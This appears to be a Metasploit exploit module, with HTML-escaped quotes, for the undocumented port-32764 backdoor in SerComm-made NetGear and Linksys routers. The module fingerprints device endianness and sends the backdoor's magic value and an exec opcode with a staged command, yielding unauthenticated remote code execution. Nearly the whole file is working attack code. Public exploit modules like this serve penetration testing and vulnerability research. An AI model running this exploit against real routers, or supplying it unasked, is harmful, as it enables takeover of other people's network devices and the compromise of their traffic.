# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStagerEcho

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "SerComm Device Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module will cause remote code execution on several SerComm devices.
        These devices typically include routers from NetGear and Linksys.
        Tested against NetGear DG834.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Eloi Vanderbeken <eloi.vanderbeken[at]gmail.com>&#039;, # Initial discovery, poc
          &#039;Matt "hostess" Andreko <mandreko[at]accuvant.com>&#039; # Msf module
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 10000, # Could be more, but this should be good enough
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        =>
        [
          [&#039;Linux MIPS Big Endian&#039;,
            {
              &#039;Arch&#039; => ARCH_MIPSBE
            }
          ],
          [&#039;Linux MIPS Little Endian&#039;,
            {
              &#039;Arch&#039; => ARCH_MIPSLE
            }
          ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;101653&#039; ],
          [ &#039;URL&#039;, &#039;https://github.com/elvanderb/TCP-32764&#039; ]
        ],
      &#039;DisclosureDate&#039; => "Dec 31 2013" ))

      register_options(
        [
          Opt::RPORT(32764)
        ], self.class)
  end

  def check
    fprint = endian_fingerprint

    case fprint
    when &#039;BE&#039;
      print_status("Detected Big Endian")
      return Msf::Exploit::CheckCode::Vulnerable
    when &#039;LE&#039;
      print_status("Detected Little Endian")
      return Msf::Exploit::CheckCode::Vulnerable
    end

    return Msf::Exploit::CheckCode::Unknown
  end

  def exploit
    execute_cmdstager(:noargs => true)
  end

  def endian_fingerprint
    begin
      connect

      sock.put(rand_text(5))
      res = sock.get_once

      disconnect

      if res && res.start_with?("MMcS")
        return &#039;BE&#039;
      elsif res && res.start_with?("ScMM")
        return &#039;LE&#039;
      end
    rescue Rex::ConnectionError => e
      print_error("Connection failed: #{e.class}: #{e}")
    end

    return nil
  end

  def execute_command(cmd, opts)
    vprint_debug(cmd)

    # Get the length of the command, for the backdoor&#039;s command injection
    cmd_length = cmd.length

    # 0x53634d4d  => Backdoor code
    # 0x07        => Exec command
    # cmd_length  => Length of command to execute, sent after communication struct
    data = [0x53634d4d, 0x07, cmd_length].pack("VVV")

    connect
    # Send command structure followed by command text
    sock.put(data+cmd)
    disconnect

    Rex.sleep(1)
  end

end

